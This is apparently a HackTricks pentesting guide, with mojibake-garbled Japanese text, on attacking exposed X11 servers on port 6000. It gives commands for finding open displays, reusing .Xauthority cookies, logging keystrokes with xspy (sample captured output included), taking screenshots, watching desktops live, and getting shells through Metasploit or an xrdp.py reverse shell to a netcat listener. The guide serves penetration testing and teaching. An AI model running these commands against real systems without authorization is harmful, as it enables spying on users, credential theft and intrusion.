# 6000 - Pentesting X11

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¦ãã ã•ã„

**Real-Time Hack News**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ãã¾ã—ã‚‡ã†

**Latest Announcements**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æœ€æ–°æƒ…å ±ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Basic Information

**X Window System** (X) ã¯ã€UNIXãƒ™ãƒ¼ã‚¹ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å¤šç›®çš„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚ã“ã‚Œã¯ã€ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ãª**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ (GUI)**ã‚’ä½œæˆã™ã‚‹ãŸã‚ã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’æä¾›ã—ã€å€‹ã€…ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ãƒ‡ã‚¶ã‚¤ãƒ³ã‚’æ‹…å½“ã—ã¾ã™ã€‚ã“ã®æŸ”è»Ÿæ€§ã«ã‚ˆã‚Šã€Xç’°å¢ƒå†…ã§å¤šæ§˜ã§ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºå¯èƒ½ãªä½“é¨“ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

**Default port:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## Enumeration

**åŒ¿åæ¥ç¶š**ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### ãƒ­ãƒ¼ã‚«ãƒ«åˆ—æŒ™

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã«ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ« **`.Xauthority`** ã¯ **X11ã«ã‚ˆã‚‹èªè¨¼ã«ä½¿ç”¨ã•ã‚Œã¾ã™**ã€‚ [**ã“ã¡ã‚‰**](https://stackoverflow.com/a/37367518) ã‹ã‚‰:
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: 128ãƒ“ãƒƒãƒˆã®ã‚­ãƒ¼ï¼ˆâ€œã‚¯ãƒƒã‚­ãƒ¼â€ï¼‰ã‚’ç”Ÿæˆã—ã€ãã‚Œã‚’ \~/.Xauthorityï¼ˆã¾ãŸã¯XAUTHORITYç’°å¢ƒå¤‰æ•°ãŒæŒ‡ã™å ´æ‰€ï¼‰ã«ä¿å­˜ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ãã‚Œã‚’å¹³æ–‡ã§ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ï¼ã‚µãƒ¼ãƒãƒ¼ã¯ã“ã®â€œã‚¯ãƒƒã‚­ãƒ¼â€ã®ã‚³ãƒ”ãƒ¼ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã€æŒã£ã¦ã„ã‚Œã°æ¥ç¶šãŒè¨±å¯ã•ã‚Œã¾ã™ã€‚ã‚­ãƒ¼ã¯DMXã«ã‚ˆã£ã¦ç”Ÿæˆã•ã‚Œã¾ã™ã€‚

{% hint style="warning" %}
**ã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹**ã«ã¯ã€ç’°å¢ƒå¤‰æ•°ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™: **`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

#### ãƒ­ãƒ¼ã‚«ãƒ«åˆ—æŒ™ã‚»ãƒƒã‚·ãƒ§ãƒ³
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
ä¾‹ã§ã¯ã€`localhost:0` ãŒ xfce4-session ã‚’å®Ÿè¡Œã—ã¦ã„ã¾ã—ãŸã€‚

## æ¥ç¶šã®ç¢ºèª
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## ã‚­ãƒ¼ãƒ­ã‚®ãƒ³ã‚°

[xspy](http://tools.kali.org/sniffingspoofing/xspy) ã‚’ä½¿ç”¨ã—ã¦ã‚­ãƒ¼ãƒœãƒ¼ãƒ‰ã®ã‚­ãƒ¼å…¥åŠ›ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã—ã¾ã™ã€‚

ã‚µãƒ³ãƒ—ãƒ«å‡ºåŠ›:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆã®ã‚­ãƒ£ãƒ—ãƒãƒ£
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãƒ“ãƒ¥ãƒ¼

Way from: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Way from: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

æœ€åˆã«ã€xwininfoã‚’ä½¿ç”¨ã—ã¦ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®IDã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

**ãƒ©ã‚¤ãƒ–ãƒ“ãƒ¥ãƒ¼ã‚¤ãƒ³ã‚°**ã«ã¯ã€æ¬¡ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
ä»–ã®æ–¹æ³•ï¼š

**Reverse Shell:** Xrdpã¯Netcatã‚’ä»‹ã—ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„ï¼š
```bash
./xrdp.py \<IP:0> â€“no-disp
```
ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã«ã¯**R-shellã‚ªãƒ—ã‚·ãƒ§ãƒ³**ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

æ¬¡ã«ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã§ãƒãƒ¼ãƒˆ5555ã§**Netcatãƒªã‚¹ãƒŠãƒ¼**ã‚’é–‹å§‹ã—ã¾ã™ã€‚
```bash
nc -lvp 5555
```
æ¬¡ã«ã€**R-Shell**ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã‚ãªãŸã®IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆã‚’å…¥åŠ›ã—ã€**R-shell**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¦ãã ã•ã„ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«å¤‰åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«é…ã‚Œãšã«ã¤ã„ã¦ã„ãã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¦ãã ã•ã„

**ç§ãŸã¡ã«å‚åŠ ã—ã¦ãã ã•ã„** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ã§ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
